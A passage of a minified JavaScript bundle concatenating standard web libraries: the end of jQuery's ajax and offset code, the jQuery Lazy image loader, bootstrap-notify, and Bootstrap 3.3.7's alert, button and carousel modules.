n,i=[],r=function(t,e){e=f.isFunction(e)?e():null==e?"":e,i[i.length]=encodeURIComponent(t)+"="+encodeURIComponent(e)};if(void 0===e&&(e=f.ajaxSettings&&f.ajaxSettings.traditional),f.isArray(t)||t.jquery&&!f.isPlainObject(t))f.each(t,(function(){r(this.name,this.value)}));else for(n in t)$e(n,t[n],e,r);return i.join("&").replace(ke,"+")},f.fn.extend({serialize:function(){return f.param(this.serializeArray())},serializeArray:function(){return this.map((function(){var t=f.prop(this,"elements");return t?f.makeArray(t):this})).filter((function(){var t=this.type;return this.name&&!f(this).is(":disabled")&&Ce.test(this.nodeName)&&!Se.test(t)&&(this.checked||!K.test(t))})).map((function(t,e){var n=f(this).val();return null==n?null:f.isArray(n)?f.map(n,(function(t){return{name:e.name,value:t.replace(_e,"\r\n")}})):{name:e.name,value:n.replace(_e,"\r\n")}})).get()}}),f.ajaxSettings.xhr=function(){try{return new t.XMLHttpRequest}catch(t){}};var Ee={0:200,1223:204},Te=f.ajaxSettings.xhr();d.cors=!!Te&&"withCredentials"in Te,d.ajax=Te=!!Te,f.ajaxTransport((function(e){var n,i;return d.cors||Te&&!e.crossDomain?{send:function(r,o){var s,a=e.xhr();if(a.open(e.type,e.url,e.async,e.username,e.password),e.xhrFields)for(s in e.xhrFields)a[s]=e.xhrFields[s];for(s in e.mimeType&&a.overrideMimeType&&a.overrideMimeType(e.mimeType),e.crossDomain||r["X-Requested-With"]||(r["X-Requested-With"]="XMLHttpRequest"),r)a.setRequestHeader(s,r[s]);n=function(t){return function(){n&&(n=i=a.onload=a.onerror=a.onabort=a.onreadystatechange=null,"abort"===t?a.abort():"error"===t?"number"!=typeof a.status?o(0,"error"):o(a.status,a.statusText):o(Ee[a.status]||a.status,a.statusText,"text"!==(a.responseType||"text")||"string"!=typeof a.responseText?{binary:a.response}:{text:a.responseText},a.getAllResponseHeaders()))}},a.onload=n(),i=a.onerror=n("error"),void 0!==a.onabort?a.onabort=i:a.onreadystatechange=function(){4===a.readyState&&t.setTimeout((function(){n&&i()}))},n=n("abort");try{a.send(e.hasContent&&e.data||null)}catch(t){if(n)throw t}},abort:function(){n&&n()}}:void 0})),f.ajaxSetup({accepts:{script:"text/javascript, application/javascript, application/ecmascript, application/x-ecmascript"},contents:{script:/\b(?:java|ecma)script\b/},converters:{"text script":function(t){return f.globalEval(t),t}}}),f.ajaxPrefilter("script",(function(t){void 0===t.cache&&(t.cache=!1),t.crossDomain&&(t.type="GET")})),f.ajaxTransport("script",(function(t){var e,n;if(t.crossDomain)return{send:function(r,o){e=f("<script>").prop({charset:t.scriptCharset,src:t.url}).on("load error",n=function(t){e.remove(),n=null,t&&o("error"===t.type?404:200,t.type)}),i.head.appendChild(e[0])},abort:function(){n&&n()}}}));var Le=[],Oe=/(=)\?(?=&|$)|\?\?/;f.ajaxSetup({jsonp:"callback",jsonpCallback:function(){var t=Le.pop()||f.expando+"_"+ae++;return this[t]=!0,t}}),f.ajaxPrefilter("json jsonp",(function(e,n,i){var r,o,s,a=!1!==e.jsonp&&(Oe.test(e.url)?"url":"string"==typeof e.data&&0===(e.contentType||"").indexOf("application/x-www-form-urlencoded")&&Oe.test(e.data)&&"data");return a||"jsonp"===e.dataTypes[0]?(r=e.jsonpCallback=f.isFunction(e.jsonpCallback)?e.jsonpCallback():e.jsonpCallback,a?e[a]=e[a].replace(Oe,"$1"+r):!1!==e.jsonp&&(e.url+=(le.test(e.url)?"&":"?")+e.jsonp+"="+r),e.converters["script json"]=function(){return s||f.error(r+" was not called"),s[0]},e.dataTypes[0]="json",o=t[r],t[r]=function(){s=arguments},i.always((function(){void 0===o?f(t).removeProp(r):t[r]=o,e[r]&&(e.jsonpCallback=n.jsonpCallback,Le.push(r)),s&&f.isFunction(o)&&o(s[0]),s=o=void 0})),"script"):void 0})),f.parseHTML=function(t,e,n){if(!t||"string"!=typeof t)return null;"boolean"==typeof e&&(n=e,e=!1),e=e||i;var r=_.exec(t),o=!n&&[];return r?[e.createElement(r[1])]:(r=et([t],e,o),o&&o.length&&f(o).remove(),f.merge([],r.childNodes))};var Ie=f.fn.load;function Ae(t){return f.isWindow(t)?t:9===t.nodeType&&t.defaultView}f.fn.load=function(t,e,n){if("string"!=typeof t&&Ie)return Ie.apply(this,arguments);var i,r,o,s=this,a=t.indexOf(" ");return a>-1&&(i=f.trim(t.slice(a)),t=t.slice(0,a)),f.isFunction(e)?(n=e,e=void 0):e&&"object"==typeof e&&(r="POST"),s.length>0&&f.ajax({url:t,type:r||"GET",dataType:"html",data:e}).done((function(t){o=arguments,s.html(i?f("<div>").append(f.parseHTML(t)).find(i):t)})).always(n&&function(t,e){s.each((function(){n.apply(this,o||[t.responseText,e,t])}))}),this},f.each(["ajaxStart","ajaxStop","ajaxComplete","ajaxError","ajaxSuccess","ajaxSend"],(function(t,e){f.fn[e]=function(t){return this.on(e,t)}})),f.expr.filters.animated=function(t){return f.grep(f.timers,(function(e){return t===e.elem})).length},f.offset={setOffset:function(t,e,n){var i,r,o,s,a,l,c=f.css(t,"position"),u=f(t),d={};"static"===c&&(t.style.position="relative"),a=u.offset(),o=f.css(t,"top"),l=f.css(t,"left"),("absolute"===c||"fixed"===c)&&(o+l).indexOf("auto")>-1?(s=(i=u.position()).top,r=i.left):(s=parseFloat(o)||0,r=parseFloat(l)||0),f.isFunction(e)&&(e=e.call(t,n,f.extend({},a))),null!=e.top&&(d.top=e.top-a.top+s),null!=e.left&&(d.left=e.left-a.left+r),"using"in e?e.using.call(t,d):u.css(d)}},f.fn.extend({offset:function(t){if(arguments.length)return void 0===t?this:this.each((function(e){f.offset.setOffset(this,t,e)}));var e,n,i=this[0],r={top:0,left:0},o=i&&i.ownerDocument;return o?(e=o.documentElement,f.contains(e,i)?(r=i.getBoundingClientRect(),n=Ae(o),{top:r.top+n.pageYOffset-e.clientTop,left:r.left+n.pageXOffset-e.clientLeft}):r):void 0},position:function(){if(this[0]){var t,e,n=this[0],i={top:0,left:0};return"fixed"===f.css(n,"position")?e=n.getBoundingClientRect():(t=this.offsetParent(),e=this.offset(),f.nodeName(t[0],"html")||(i=t.offset()),i.top+=f.css(t[0],"borderTopWidth",!0),i.left+=f.css(t[0],"borderLeftWidth",!0)),{top:e.top-i.top-f.css(n,"marginTop",!0),left:e.left-i.left-f.css(n,"marginLeft",!0)}}},offsetParent:function(){return this.map((function(){for(var t=this.offsetParent;t&&"static"===f.css(t,"position");)t=t.offsetParent;return t||Lt}))}}),f.each({scrollLeft:"pageXOffset",scrollTop:"pageYOffset"},(function(t,e){var n="pageYOffset"===e;f.fn[t]=function(i){return B(this,(function(t,i,r){var o=Ae(t);return void 0===r?o?o[e]:t[i]:void(o?o.scrollTo(n?o.pageXOffset:r,n?r:o.pageYOffset):t[i]=r)}),t,i,arguments.length)}})),f.each(["top","left"],(function(t,e){f.cssHooks[e]=It(d.pixelPosition,(function(t,n){return n?(n=Ot(t,e),$t.test(n)?f(t).position()[e]+"px":n):void 0}))})),f.each({Height:"height",Width:"width"},(function(t,e){f.each({padding:"inner"+t,content:e,"":"outer"+t},(function(n,i){f.fn[i]=function(i,r){var o=arguments.length&&(n||"boolean"!=typeof i),s=n||(!0===i||!0===r?"margin":"border");return B(this,(function(e,n,i){var r;return f.isWindow(e)?e.document.documentElement["client"+t]:9===e.nodeType?(r=e.documentElement,Math.max(e.body["scroll"+t],r["scroll"+t],e.body["offset"+t],r["offset"+t],r["client"+t])):void 0===i?f.css(e,n,s):f.style(e,n,i,s)}),e,o?i:void 0,o,null)}}))})),f.fn.extend({bind:function(t,e,n){return this.on(t,null,e,n)},unbind:function(t,e){return this.off(t,null,e)},delegate:function(t,e,n,i){return this.on(e,t,n,i)},undelegate:function(t,e,n){return 1===arguments.length?this.off(t,"**"):this.off(e,t||"**",n)},size:function(){return this.length}}),f.fn.andSelf=f.fn.addBack,"function"==typeof define&&define.amd&&define("jquery",[],(function(){return f}));var Pe=t.jQuery,Ne=t.$;return f.noConflict=function(e){return t.$===f&&(t.$=Ne),e&&t.jQuery===f&&(t.jQuery=Pe),f},e||(t.jQuery=t.$=f),f})),function(t,e){"use strict";function n(n,i,o,a,l){function c(){_=t.devicePixelRatio>1,o=u(o),i.delay>=0&&setTimeout((function(){d(!0)}),i.delay),(i.delay<0||i.combined)&&(a.e=function(t,e){var r,o=0;return function(s,a){function l(){o=+new Date,e.call(n,s)}var c=+new Date-o;r&&clearTimeout(r),c>t||!i.enableThrottle||a?l():r=setTimeout(l,t-c)}}(i.throttle,(function(t){"resize"===t.type&&(k=x=-1),d(t.all)})),a.a=function(t){t=u(t),o.push.apply(o,t)},a.g=function(){return o=r(o).filter((function(){return!r(this).data(i.loadedName)}))},a.f=function(t){for(var e=0;e<t.length;e++){var n=o.filter((function(){return this===t[e]}));n.length&&d(!1,n)}},d(),r(i.appendScroll).on("scroll."+l+" resize."+l,a.e))}function u(t){var o=i.defaultImage,s=i.placeholder,a=i.imageBase,l=i.srcsetAttribute,c=i.loaderAttribute,u=i._f||{};t=r(t).filter((function(){var t=r(this),n=m(this);return!t.data(i.handledName)&&(t.attr(i.attribute)||t.attr(l)||t.attr(c)||u[n]!==e)})).data("plugin_"+i.name,n);for(var d=0,h=t.length;d<h;d++){var f=r(t[d]),p=m(t[d]),g=f.attr(i.imageBaseAttribute)||a;p===E&&g&&f.attr(l)&&f.attr(l,v(f.attr(l),g)),u[p]===e||f.attr(c)||f.attr(c,u[p]),p===E&&o&&!f.attr(T)?f.attr(T,o):p===E||!s||f.css(I)&&"none"!==f.css(I)||f.css(I,"url('"+s+"')")}return t}function d(t,e){if(o.length){for(var s=e||o,a=!1,l=i.imageBase||"",c=i.srcsetAttribute,u=i.handledName,d=0;d<s.length;d++)if(t||e||f(s[d])){var p=r(s[d]),g=m(s[d]),v=p.attr(i.attribute),y=p.attr(i.imageBaseAttribute)||l,b=p.attr(i.loaderAttribute);p.data(u)||i.visibleOnly&&!p.is(":visible")||!((v||p.attr(c))&&(g===E&&(y+v!==p.attr(T)||p.attr(c)!==p.attr(L))||g!==E&&y+v!==p.css(I))||b)||(a=!0,p.data(u,!0),h(p,g,y,b))}a&&(o=r(o).filter((function(){return!r(this).data(u)})))}else i.autoDestroy&&n.destroy()}function h(t,e,n,o){++w;var s=function(){b("onError",t),y(),s=r.noop};b("beforeLoad",t);var a=i.attribute,l=i.srcsetAttribute,c=i.sizesAttribute,u=i.retinaAttribute,d=i.removeAttribute,h=i.loadedName,f=t.attr(u);if(o){var p=function(){d&&t.removeAttr(i.loaderAttribute),t.data(h,!0),b(S,t),setTimeout(y,1),p=r.noop};t.off($).one($,s).one(C,p),b(o,t,(function(e){e?(t.off(C),p()):(t.off($),s())}))||t.trigger($)}else{var g=r(new Image);g.one($,s).one(C,(function(){t.hide(),e===E?t.attr(O,g.attr(O)).attr(L,g.attr(L)).attr(T,g.attr(T)):t.css(I,"url('"+g.attr(T)+"')"),t[i.effect](i.effectTime),d&&(t.removeAttr(a+" "+l+" "+u+" "+i.imageBaseAttribute),c!==O&&t.removeAttr(c)),t.data(h,!0),b(S,t),g.remove(),y()}));var m=(_&&f?f:t.attr(a))||"";g.attr(O,t.attr(c)).attr(L,t.attr(l)).attr(T,m?n+m:null),g.complete&&g.trigger(C)}}function f(t){var e=t.getBoundingClientRect(),n=i.scrollDirection,r=i.threshold,o=g()+r>e.top&&-r<e.bottom,s=p()+r>e.left&&-r<e.right;return"vertical"===n?o:("horizontal"===n||o)&&s}function p(){return k>=0?k:k=r(t).width()}function g(){return x>=0?x:x=r(t).height()}function m(t){return t.tagName.toLowerCase()}function v(t,e){if(e){var n=t.split(",");t="";for(var i=0,r=n.length;i<r;i++)t+=e+n[i].trim()+(i!==r-1?",":"")}return t}function y(){--w,o.length||w||b("onFinishedAll")}function b(t,e,r){return!!(t=i[t])&&(t.apply(n,[].slice.call(arguments,1)),!0)}var w=0,k=-1,x=-1,_=!1,S="afterLoad",C="load",$="error",E="img",T="src",L="srcset",O="sizes",I="background-image";"event"===i.bind||s?c():r(t).on(C+"."+l,c)}function i(i,s){var a=this,l=r.extend({},a.config,s),c={},u=l.name+"-"+ ++o;return a.config=function(t,n){return n===e?l[t]:(l[t]=n,a)},a.addItems=function(t){return c.a&&c.a("string"===r.type(t)?r(t):t),a},a.getItems=function(){return c.g?c.g():{}},a.update=function(t){return c.e&&c.e({},!t),a},a.force=function(t){return c.f&&c.f("string"===r.type(t)?r(t):t),a},a.loadAll=function(){return c.e&&c.e({all:!0},!0),a},a.destroy=function(){return r(l.appendScroll).off("."+u,c.e),r(t).off("."+u),c={},e},n(a,l,i,c,u),l.chainable?i:a}var r=t.jQuery||t.Zepto,o=0,s=!1;r.fn.Lazy=r.fn.lazy=function(t){return new i(this,t)},r.Lazy=r.lazy=function(t,n,o){if(r.isFunction(n)&&(o=n,n=[]),r.isFunction(o)){t=r.isArray(t)?t:[t],n=r.isArray(n)?n:[n];for(var s=i.prototype.config,a=s._f||(s._f={}),l=0,c=t.length;l<c;l++)(s[t[l]]===e||r.isFunction(s[t[l]]))&&(s[t[l]]=o);for(var u=0,d=n.length;u<d;u++)a[n[u]]=t[0]}},i.prototype.config={name:"lazy",chainable:!0,autoDestroy:!0,bind:"load",threshold:500,visibleOnly:!1,appendScroll:t,scrollDirection:"both",imageBase:null,defaultImage:"data:image/gif;base64,R0lGODlhAQABAIAAAP///wAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==",placeholder:null,delay:-1,combined:!1,attribute:"data-src",srcsetAttribute:"data-srcset",sizesAttribute:"data-sizes",retinaAttribute:"data-retina",loaderAttribute:"data-loader",imageBaseAttribute:"data-imagebase",removeAttribute:!0,handledName:"handled",loadedName:"loaded",effect:"show",effectTime:0,enableThrottle:!0,throttle:250,beforeLoad:e,afterLoad:e,onError:e,onFinishedAll:e},r(t).on("load",(function(){s=!0}))}(window),$.fn.serializeObject=function(){"use strict";var t={};return $.each(this.serializeArray(),(function(e,n){var i=t[n.name];null!=i?$.isArray(i)?i.push(n.value):t[n.name]=[i,n.value]:t[n.name]=n.value})),t},function(t){"function"==typeof define&&define.amd?define(["jquery"],t):t("object"==typeof exports?require("jquery"):jQuery)}((function(t){function e(e,i,r){var o={content:{message:"object"==typeof i?i.message:i,title:i.title?i.title:"",icon:i.icon?i.icon:"",url:i.url?i.url:"#",target:i.target?i.target:"-"}};r=t.extend(!0,{},o,r),this.settings=t.extend(!0,{},n,r),this._defaults=n,"-"===this.settings.content.target&&(this.settings.content.target=this.settings.url_target),this.animations={start:"webkitAnimationStart oanimationstart MSAnimationStart animationstart",end:"webkitAnimationEnd oanimationend MSAnimationEnd animationend"},"number"==typeof this.settings.offset&&(this.settings.offset={x:this.settings.offset,y:this.settings.offset}),(this.settings.allow_duplicates||!this.settings.allow_duplicates&&!function(e){var n=!1;return t('[data-notify="container"]').each((function(i,r){var o=t(r),s=o.find('[data-notify="title"]').text().trim(),a=o.find('[data-notify="message"]').html().trim(),l=s===t("<div>"+e.settings.content.title+"</div>").html().trim(),c=a===t("<div>"+e.settings.content.message+"</div>").html().trim(),u=o.hasClass("alert-"+e.settings.type);return l&&c&&u&&(n=!0),!n})),n}(this))&&this.init()}var n={element:"body",position:null,type:"info",allow_dismiss:!0,allow_duplicates:!0,newest_on_top:!1,showProgressbar:!1,placement:{from:"top",align:"right"},offset:20,spacing:10,z_index:1031,delay:5e3,timer:1e3,url_target:"_blank",mouse_over:null,animate:{enter:"animated fadeInDown",exit:"animated fadeOutUp"},onShow:null,onShown:null,onClose:null,onClosed:null,icon_type:"class",template:'<div data-notify="container" class="col-xs-11 col-sm-4 alert alert-{0}" role="alert"><button type="button" aria-hidden="true" class="close" data-notify="dismiss">&times;</button><span data-notify="icon"></span> <span data-notify="title">{1}</span> <span data-notify="message">{2}</span><div class="progress" data-notify="progressbar"><div class="progress-bar progress-bar-{0}" role="progressbar" aria-valuenow="0" aria-valuemin="0" aria-valuemax="100" style="width: 0%;"></div></div><a href="{3}" target="{4}" data-notify="url"></a></div>'};String.format=function(){for(var t=arguments[0],e=1;e<arguments.length;e++)t=t.replace(RegExp("\\{"+(e-1)+"\\}","gm"),arguments[e]);return t},t.extend(e.prototype,{init:function(){var t=this;this.buildNotify(),this.settings.content.icon&&this.setIcon(),"#"!=this.settings.content.url&&this.styleURL(),this.styleDismiss(),this.placement(),this.bind(),this.notify={$ele:this.$ele,update:function(e,n){var i={};for(var r in"string"==typeof e?i[e]=n:i=e,i)switch(r){case"type":this.$ele.removeClass("alert-"+t.settings.type),this.$ele.find('[data-notify="progressbar"] > .progress-bar').removeClass("progress-bar-"+t.settings.type),t.settings.type=i[r],this.$ele.addClass("alert-"+i[r]).find('[data-notify="progressbar"] > .progress-bar').addClass("progress-bar-"+i[r]);break;case"icon":var o=this.$ele.find('[data-notify="icon"]');"class"===t.settings.icon_type.toLowerCase()?o.removeClass(t.settings.content.icon).addClass(i[r]):(o.is("img")||o.find("img"),o.attr("src",i[r]));break;case"progress":var s=t.settings.delay-t.settings.delay*(i[r]/100);this.$ele.data("notify-delay",s),this.$ele.find('[data-notify="progressbar"] > div').attr("aria-valuenow",i[r]).css("width",i[r]+"%");break;case"url":this.$ele.find('[data-notify="url"]').attr("href",i[r]);break;case"target":this.$ele.find('[data-notify="url"]').attr("target",i[r]);break;default:this.$ele.find('[data-notify="'+r+'"]').html(i[r])}var a=this.$ele.outerHeight()+parseInt(t.settings.spacing)+parseInt(t.settings.offset.y);t.reposition(a)},close:function(){t.close()}}},buildNotify:function(){var e=this.settings.content;this.$ele=t(String.format(this.settings.template,this.settings.type,e.title,e.message,e.url,e.target)),this.$ele.attr("data-notify-position",this.settings.placement.from+"-"+this.settings.placement.align),this.settings.allow_dismiss||this.$ele.find('[data-notify="dismiss"]').css("display","none"),(this.settings.delay<=0&&!this.settings.showProgressbar||!this.settings.showProgressbar)&&this.$ele.find('[data-notify="progressbar"]').remove()},setIcon:function(){"class"===this.settings.icon_type.toLowerCase()?this.$ele.find('[data-notify="icon"]').addClass(this.settings.content.icon):this.$ele.find('[data-notify="icon"]').is("img")?this.$ele.find('[data-notify="icon"]').attr("src",this.settings.content.icon):this.$ele.find('[data-notify="icon"]').append('<img src="'+this.settings.content.icon+'" alt="Notify Icon" />')},styleDismiss:function(){this.$ele.find('[data-notify="dismiss"]').css({position:"absolute",right:"10px",top:"5px",zIndex:this.settings.z_index+2})},styleURL:function(){this.$ele.find('[data-notify="url"]').css({backgroundImage:"url(data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7)",height:"100%",left:0,position:"absolute",top:0,width:"100%",zIndex:this.settings.z_index+1})},placement:function(){var e=this,n=this.settings.offset.y,i={display:"inline-block",margin:"0px auto",position:this.settings.position?this.settings.position:"body"===this.settings.element?"fixed":"absolute",transition:"all .5s ease-in-out",zIndex:this.settings.z_index},r=!1,o=this.settings;switch(t('[data-notify-position="'+this.settings.placement.from+"-"+this.settings.placement.align+'"]:not([data-closing="true"])').each((function(){n=Math.max(n,parseInt(t(this).css(o.placement.from))+parseInt(t(this).outerHeight())+parseInt(o.spacing))})),!0===this.settings.newest_on_top&&(n=this.settings.offset.y),i[this.settings.placement.from]=n+"px",this.settings.placement.align){case"left":case"right":i[this.settings.placement.align]=this.settings.offset.x+"px";break;case"center":i.left=0,i.right=0}this.$ele.css(i).addClass(this.settings.animate.enter),t.each(Array("webkit-","moz-","o-","ms-",""),(function(t,n){e.$ele[0].style[n+"AnimationIterationCount"]=1})),t(this.settings.element).append(this.$ele),!0===this.settings.newest_on_top&&(n=parseInt(n)+parseInt(this.settings.spacing)+this.$ele.outerHeight(),this.reposition(n)),t.isFunction(e.settings.onShow)&&e.settings.onShow.call(this.$ele),this.$ele.one(this.animations.start,(function(){r=!0})).one(this.animations.end,(function(){e.$ele.removeClass(e.settings.animate.enter),t.isFunction(e.settings.onShown)&&e.settings.onShown.call(this)})),setTimeout((function(){r||t.isFunction(e.settings.onShown)&&e.settings.onShown.call(this)}),600)},bind:function(){var e=this;if(this.$ele.find('[data-notify="dismiss"]').on("click",(function(){e.close()})),this.$ele.mouseover((function(){t(this).data("data-hover","true")})).mouseout((function(){t(this).data("data-hover","false")})),this.$ele.data("data-hover","false"),this.settings.delay>0){e.$ele.data("notify-delay",e.settings.delay);var n=setInterval((function(){var t=parseInt(e.$ele.data("notify-delay"))-e.settings.timer;if("false"===e.$ele.data("data-hover")&&"pause"===e.settings.mouse_over||"pause"!=e.settings.mouse_over){var i=(e.settings.delay-t)/e.settings.delay*100;e.$ele.data("notify-delay",t),e.$ele.find('[data-notify="progressbar"] > div').attr("aria-valuenow",i).css("width",i+"%")}t<=-e.settings.timer&&(clearInterval(n),e.close())}),e.settings.timer)}},close:function(){var e=this,n=parseInt(this.$ele.css(this.settings.placement.from)),i=!1;this.$ele.attr("data-closing","true").addClass(this.settings.animate.exit),e.reposition(n),t.isFunction(e.settings.onClose)&&e.settings.onClose.call(this.$ele),this.$ele.one(this.animations.start,(function(){i=!0})).one(this.animations.end,(function(){t(this).remove(),t.isFunction(e.settings.onClosed)&&e.settings.onClosed.call(this)})),setTimeout((function(){i||(e.$ele.remove(),e.settings.onClosed&&e.settings.onClosed(e.$ele))}),600)},reposition:function(e){var n=this,i='[data-notify-position="'+this.settings.placement.from+"-"+this.settings.placement.align+'"]:not([data-closing="true"])',r=this.$ele.nextAll(i);!0===this.settings.newest_on_top&&(r=this.$ele.prevAll(i)),r.each((function(){t(this).css(n.settings.placement.from,e),e=parseInt(e)+parseInt(n.settings.spacing)+t(this).outerHeight()}))}}),t.notify=function(t,n){return new e(this,t,n).notify},t.notifyDefaults=function(e){return n=t.extend(!0,{},n,e)},t.notifyClose=function(e){"warning"===e&&(e="danger"),void 0===e||"all"===e?t("[data-notify]").find('[data-notify="dismiss"]').trigger("click"):"success"===e||"info"===e||"warning"===e||"danger"===e?t(".alert-"+e+"[data-notify]").find('[data-notify="dismiss"]').trigger("click"):e?t(e+"[data-notify]").find('[data-notify="dismiss"]').trigger("click"):t('[data-notify-position="'+e+'"]').find('[data-notify="dismiss"]').trigger("click")},t.notifyCloseExcept=function(e){"warning"===e&&(e="danger"),"success"===e||"info"===e||"warning"===e||"danger"===e?t("[data-notify]").not(".alert-"+e).find('[data-notify="dismiss"]').trigger("click"):t("[data-notify]").not(e).find('[data-notify="dismiss"]').trigger("click")}})),"undefined"==typeof jQuery)throw new Error("Bootstrap's JavaScript requires jQuery");var PARSEIT_UC;!function(t){"use strict";var e=jQuery.fn.jquery.split(" ")[0].split(".");if(e[0]<2&&e[1]<9||1==e[0]&&9==e[1]&&e[2]<1||e[0]>3)throw new Error("Bootstrap's JavaScript requires jQuery version 1.9.1 or higher, but lower than version 4")}(),function(t){"use strict";t.fn.emulateTransitionEnd=function(e){var n=!1,i=this;t(this).one("bsTransitionEnd",(function(){n=!0}));return setTimeout((function(){n||t(i).trigger(t.support.transition.end)}),e),this},t((function(){t.support.transition=function(){var t=document.createElement("bootstrap"),e={WebkitTransition:"webkitTransitionEnd",MozTransition:"transitionend",OTransition:"oTransitionEnd otransitionend",transition:"transitionend"};for(var n in e)if(void 0!==t.style[n])return{end:e[n]};return!1}(),t.support.transition&&(t.event.special.bsTransitionEnd={bindType:t.support.transition.end,delegateType:t.support.transition.end,handle:function(e){if(t(e.target).is(this))return e.handleObj.handler.apply(this,arguments)}})}))}(jQuery),function(t){"use strict";var e='[data-dismiss="alert"]',n=function(n){t(n).on("click",e,this.close)};n.VERSION="3.3.7",n.TRANSITION_DURATION=150,n.prototype.close=function(e){function i(){s.detach().trigger("closed.bs.alert").remove()}var r=t(this),o=r.attr("data-target");o||(o=(o=r.attr("href"))&&o.replace(/.*(?=#[^\s]*$)/,""));var s=t("#"===o?[]:o);e&&e.preventDefault(),s.length||(s=r.closest(".alert")),s.trigger(e=t.Event("close.bs.alert")),e.isDefaultPrevented()||(s.removeClass("in"),t.support.transition&&s.hasClass("fade")?s.one("bsTransitionEnd",i).emulateTransitionEnd(n.TRANSITION_DURATION):i())};var i=t.fn.alert;t.fn.alert=function(e){return this.each((function(){var i=t(this),r=i.data("bs.alert");r||i.data("bs.alert",r=new n(this)),"string"==typeof e&&r[e].call(i)}))},t.fn.alert.Constructor=n,t.fn.alert.noConflict=function(){return t.fn.alert=i,this},t(document).on("click.bs.alert.data-api",e,n.prototype.close)}(jQuery),function(t){"use strict";function e(e){return this.each((function(){var i=t(this),r=i.data("bs.button"),o="object"==typeof e&&e;r||i.data("bs.button",r=new n(this,o)),"toggle"==e?r.toggle():e&&r.setState(e)}))}var n=function(e,i){this.$element=t(e),this.options=t.extend({},n.DEFAULTS,i),this.isLoading=!1};n.VERSION="3.3.7",n.DEFAULTS={loadingText:"loading..."},n.prototype.setState=function(e){var n="disabled",i=this.$element,r=i.is("input")?"val":"html",o=i.data();e+="Text",null==o.resetText&&i.data("resetText",i[r]()),setTimeout(t.proxy((function(){i[r](null==o[e]?this.options[e]:o[e]),"loadingText"==e?(this.isLoading=!0,i.addClass(n).attr(n,n).prop(n,!0)):this.isLoading&&(this.isLoading=!1,i.removeClass(n).removeAttr(n).prop(n,!1))}),this),0)},n.prototype.toggle=function(){var t=!0,e=this.$element.closest('[data-toggle="buttons"]');if(e.length){var n=this.$element.find("input");"radio"==n.prop("type")?(n.prop("checked")&&(t=!1),e.find(".active").removeClass("active"),this.$element.addClass("active")):"checkbox"==n.prop("type")&&(n.prop("checked")!==this.$element.hasClass("active")&&(t=!1),this.$element.toggleClass("active")),n.prop("checked",this.$element.hasClass("active")),t&&n.trigger("change")}else this.$element.attr("aria-pressed",!this.$element.hasClass("active")),this.$element.toggleClass("active")};var i=t.fn.button;t.fn.button=e,t.fn.button.Constructor=n,t.fn.button.noConflict=function(){return t.fn.button=i,this},t(document).on("click.bs.button.data-api",'[data-toggle^="button"]',(function(n){var i=t(n.target).closest(".btn");e.call(i,"toggle"),t(n.target).is('input[type="radio"], input[type="checkbox"]')||(n.preventDefault(),i.is("input,button")?i.trigger("focus"):i.find("input:visible,button:visible").first().trigger("focus"))})).on("focus.bs.button.data-api blur.bs.button.data-api",'[data-toggle^="button"]',(function(e){t(e.target).closest(".btn").toggleClass("focus",/^focus(in)?$/.test(e.type))}))}(jQuery),function(t){"use strict";function e(e){return this.each((function(){var i=t(this),r=i.data("bs.carousel"),o=t.extend({},n.DEFAULTS,i.data(),"object"==typeof e&&e),s="string"==typeof e?e:o.slide;r||i.data("bs.carousel",r=new n(this,o)),"number"==typeof e?r.to(e):s?r[s]():o.interval&&r.pause().cycle()}))}var n=function(e,n){this.$element=t(e),this.$indicators=this.$element.find(".carousel-indicators"),this.options=n,this.paused=null,this.sliding=null,this.interval=null,this.$active=null,this.$items=null,this.options.keyboard&&this.$element.on("keydown.bs.carousel",t.proxy(this.keydown,this)),"hover"==this.options.pause&&!("ontouchstart"in document.documentElement)&&this.$element.on("mouseenter.bs.carousel",t.proxy(this.pause,this)).on("mouseleave.bs.carousel",t.proxy(this.cycle,this))};n.VERSION="3.3.7",n.TRANSITION_DURATION=600,n.DEFAULTS={interval:5e3,pause:"hover",wrap:!0,keyboard:!0},n.prototype.keydown=function(t){if(!/input|textarea/i.test(t.target.tagName)){switch(t.which){case 37:this.prev();break;case 39:this.next();break;default:return}t.preventDefault()}},n.prototype.cycle=function(e){return e||(this.paused=!1),this.interval&&clearInterval(this.interval),this.options.interval&&!this.paused&&(this.interval=setInterval(t.proxy(this.next,this),this.options.interval)),this},n.prototype.getItemIndex=function(t){return this.$items=t.parent().children(".item"),this.$items.index(t||this.$active)},n.prototype.getItemForDirection=function(t,e){var n=this.getItemIndex(e);if(("prev"==t&&0===n||"next"==t&&n==this.$items.length-1)&&!this.options.wrap)return e;var i=(n+("prev"==t?-1:1))%this.$items.length;return this.$items.eq(i)},n.prototype.to=function(t){var e=this,n=this.getItemIndex(this.$active=this.$element.find(".item.active"));if(!(t>this.$items.length-1||t<0))return this.sliding?this.$element.one("slid.bs.carousel",(function(){e.to(t)})):n==t?this.pause().cycle():this.slide(t>n?"next":"prev",this.$items.eq(t))},n.prototype.pause=function(e){return e||(this.paused=!0),this.$element.find(".next, .prev").length&&t.support.transition&&(this.$element.trigger(t.support.transition.end),this.cycle(!0)),this.interval=clearInterval(this.interval),this},n.prototype.next=function(){if(!this.sliding)return this.slide("next")},n.prototype.prev=function(){if(!this.sliding)return this.slide("prev")},n.prototype.slide=function(e,i){var r=this.$element.find(".item.active"),o=i||this.getItemForDirection(e,r),s=this.interval,a="next"==e?"left":"right",l=this;if(o.hasClass("active"))return this.sliding=!1;var c=o[0],u=t.Event("slide.bs.carousel",{relatedTarget:c,direction:a});if(this.$element.trigger(u),!u.isDefaultPrevented()){if(this.sliding=!0,s&&this.pause(),this.$indicators.length){this.$indicators.find(".active").removeClass("active");var d=t(this.$indicators.children()[this.getItemIndex(o)]);d&&d.addClass("active")}var h=t.Event("slid.bs.carousel",{relatedTarget:c,direction:a});return t.support.transition&&this.$element.hasClass("slide")?(o.addClass(e),o[0].offsetWidth,r.addClass(a),o.addClass(a),r.one("bsTransitionEnd",(function(){o.removeClass([e,a].join(" ")).addClass("active"),r.removeClass(["active",a].join(" ")),l.sliding=!1,setTimeout((function(){l.$element.trigger(h)}),0)})).emulateTransitionEnd(n.TRANSITION_DURATION)):(r.removeClass("active"),o.addClass("active"),this.sliding=!1,this.$element.trigger(h)),s&&this.cycle(),this}};var i=t.fn.carousel;t.fn.carousel=e,t.fn.carousel.Constructor=n,t.fn.carousel.noConflict=function(){return t.fn.carousel=i,this};var r=function(n){var 